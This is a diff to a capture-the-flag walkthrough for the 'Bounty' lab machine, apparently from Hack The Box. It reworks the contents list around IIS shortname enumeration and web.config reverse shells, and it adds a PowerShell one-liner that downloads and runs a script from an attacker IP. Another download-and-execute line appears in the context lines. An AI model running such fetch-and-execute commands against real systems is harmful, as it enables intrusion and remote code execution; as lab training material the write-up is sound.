@@ -5,11 +5,11 @@ Info: Bounty is an easy to medium difficulty machine, which features an interest
 1. Initial Nmap Enumeration
 2. Initial request  findings
 3. Tech Stack
-4. Shortname files/folders/directories IIS Vulnerability with tilde character
-5. Reverse Shell using web.config
-6. SystemInfo
-
-
+4. Using Web.config to execute ASPX code and get a reverse shell
+5. Shortname files/folders/directories IIS Vulnerability with tilde character
+6. Reverse Shell using web.config
+7. SystemInfo
+8. Powershell to download file
 
 ##### Initial Nmap enumeration
 ```
@@ -311,3 +311,8 @@ echo "powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.
 ```
 
 9. You should get the SYSTEM shell.
+
+#### Powershell to Download the file
+```
+powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.5:8081/winPEAS.ps1')"
+```
